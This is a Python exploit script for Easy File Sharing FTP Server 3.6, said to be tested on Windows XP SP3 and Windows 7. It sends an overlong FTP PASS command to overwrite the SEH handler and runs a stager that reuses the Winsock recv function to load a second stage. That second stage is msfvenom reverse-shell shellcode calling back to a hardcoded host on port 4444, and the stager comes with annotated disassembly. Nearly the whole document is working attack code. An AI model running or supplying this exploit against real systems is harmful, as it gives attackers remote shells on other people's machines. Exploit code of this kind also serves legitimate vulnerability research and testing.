'''exploit : Easy File Sharing FTP Server 3.6 FTP PASS command buffer overflow using socket rcv function reuse
Exploit Creation creds : Goutham Madhwaraj ( @barriersec.com)
tested on : windows xp sp3 (x86) , windows 7 (x86)
'''
import socket
import sys
from time import sleep
host = "192.168.0.102"
port = 2000


con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "[+]connecting to host..."
	con.connect((host,port))
	print con.recv(1024)
except:
	print "could not connect to the host"


'''
socket address :
#013EA014   0000             ADD BYTE PTR DS:[EAX],AL
#013EA016   74 01            JE SHORT 013EA019

current esp : 013E9ED4

013EA014 - 013E9ED4 = 0x140

#for getting socket descriptor


"\x54\x59\x66\x81\xC1\x40\x01\xFF\x31\x59\xC1\xE9\x08\xC1\xE9\x08"

013EADED   54               PUSH ESP
013EADEE   59               POP ECX
013EADEF   66:81C1 4001     ADD CX,140
013EADF4   FF31             PUSH DWORD PTR DS:[ECX]
013EADF6   59               POP ECX
013EADF7   C1E9 08          SHR ECX,8
013EADFA   C1E9 08          SHR ECX,8


"\x33\xD2\x52\x80\xC6\x02\x52"


# push flags and buff size

013EADFD   33D2             XOR EDX,EDX
013EADFF   52               PUSH EDX
013EAE00   80C6 02          ADD DH,2
013EAE03   52               PUSH EDX
#push start address for payload buffer and socket descriptor

"\x54\x5A\x66\x81\xC2\x50\x0F\x52\x51"

54               PUSH ESP
5A               POP EDX
66:81C2 500F     ADD DX,0F50
52               PUSH EDX
51               push ECX
               
#push winsock rcv in eax and call eax to recieve payload and execute .

"\xB8\xAA\x74\x62\x45\xC1\xE8\x08\xFF\xD0"
013EADED   B8 AA746245      MOV EAX,456274AA
013EADF2   C1E8 08          SHR EAX,8
           
013EADF5   FFD0             CALL EAX

--------------------------------------------------------------------------------------------------
'''


user = "USER anonymous"+"\r\n"
con.send(user)
print con.recv(1024)

#pop pop ret 10017F21 SSLEAY32.dll
seh = "\x21\x7F\x01\x10"

#forward jump + 22 bytes
nseh = "\xEB\x14\x90\x90"


payload = (

"\x54\x59\x66\x81\xC1\x40\x01\xFF\x31\x59\xC1\xE9\x08\xC1\xE9\x08"
"\x33\xD2\x52\x80\xC6\x02\x52"
"\x54\x5A\x66\x81\xC2\x50\x0F\x52\x51"
"\xB8\xAA\x74\x62\x45\xC1\xE8\x08\xFF\xD0"
)

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.104" EXITFUNC=thread -b "\x00" -f c
final_payload = (
"\xd9\xeb\xbd\xa4\x89\x8a\xef\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x83\xea\xfc\x31\x6a\x13\x03\xce\x9a\x68\x1a\xf2\x75\xee"
"\xe5\x0a\x86\x8f\x6c\xef\xb7\x8f\x0b\x64\xe7\x3f\x5f\x28\x04"
"\xcb\x0d\xd8\x9f\xb9\x99\xef\x28\x77\xfc\xde\xa9\x24\x3c\x41"
"\x2a\x37\x11\xa1\x13\xf8\x64\xa0\x54\xe5\x85\xf0\x0d\x61\x3b"
"\xe4\x3a\x3f\x80\x8f\x71\xd1\x80\x6c\xc1\xd0\xa1\x23\x59\x8b"
"\x61\xc2\x8e\xa7\x2b\xdc\xd3\x82\xe2\x57\x27\x78\xf5\xb1\x79"
"\x81\x5a\xfc\xb5\x70\xa2\x39\x71\x6b\xd1\x33\x81\x16\xe2\x80"
"\xfb\xcc\x67\x12\x5b\x86\xd0\xfe\x5d\x4b\x86\x75\x51\x20\xcc"
"\xd1\x76\xb7\x01\x6a\x82\x3c\xa4\xbc\x02\x06\x83\x18\x4e\xdc"
"\xaa\x39\x2a\xb3\xd3\x59\x95\x6c\x76\x12\x38\x78\x0b\x79\x55"
"\x4d\x26\x81\xa5\xd9\x31\xf2\x97\x46\xea\x9c\x9b\x0f\x34\x5b"
"\xdb\x25\x80\xf3\x22\xc6\xf1\xda\xe0\x92\xa1\x74\xc0\x9a\x29"
"\x84\xed\x4e\xfd\xd4\x41\x21\xbe\x84\x21\x91\x56\xce\xad\xce"
"\x47\xf1\x67\x67\xed\x08\xe0\x48\x5a\x12\x98\x20\x99\x12\x49"
"\xed\x14\xf4\x03\x1d\x71\xaf\xbb\x84\xd8\x3b\x5d\x48\xf7\x46"
"\x5d\xc2\xf4\xb7\x10\x23\x70\xab\xc5\xc3\xcf\x91\x40\xdb\xe5"
"\xbd\x0f\x4e\x62\x3d\x59\x73\x3d\x6a\x0e\x45\x34\xfe\xa2\xfc"
"\xee\x1c\x3f\x98\xc9\xa4\xe4\x59\xd7\x25\x68\xe5\xf3\x35\xb4"
"\xe6\xbf\x61\x68\xb1\x69\xdf\xce\x6b\xd8\x89\x98\xc0\xb2\x5d"
"\x5c\x2b\x05\x1b\x61\x66\xf3\xc3\xd0\xdf\x42\xfc\xdd\xb7\x42"
"\x85\x03\x28\xac\x5c\x80\x48\x4f\x74\xfd\xe0\xd6\x1d\xbc\x6c"
"\xe9\xc8\x83\x88\x6a\xf8\x7b\x6f\x72\x89\x7e\x2b\x34\x62\xf3"
"\x24\xd1\x84\xa0\x45\xf0"

)

crash ="PASS " + "\x2c" + "A"*2559 + nseh + seh + "\xCC"*22  + payload + "\xCC"*40 +"\r\n"



print "[+] sending initial payload in password command...\n"
#sending exploit
con.send(crash)
print "[+] sending final payload in password command...\n"
sleep(1)
con.send(final_payload + "\xCC"*10)
print con.recv(1024)
con.close()